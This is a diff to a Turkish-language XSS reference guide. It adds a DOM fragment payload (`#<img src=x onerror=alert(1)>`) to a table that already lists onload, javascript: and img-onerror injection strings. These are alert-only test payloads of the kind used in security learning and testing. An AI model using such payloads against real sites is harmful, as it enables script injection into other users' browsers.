@@ -56,6 +56,9 @@ Saldırganlar hedef kullanıcının tarayıcısında zararlı JavaScript kodu ç
 | `" onload="alert(1)` | iframe, body, img gibi yüklenince tetikleme | ⚠️ |
 | `javascript:alert(1)` | href veya src gibi URL attribute’larında çalıştırma | ⚠️ |
 | `"><img src=x onerror=alert(1)>` | HTML element kapatıp img ile XSS | ✅ |
+| `#<img src=x onerror=alert(1)>` | #fragment → sunucuya gitmeyen, sadece tarayıcıda görünen parça| ✅ |
+
+
 ---
 
 ## 🕰️ Eski / Çalışma İhtimali Düşük Payload'lar
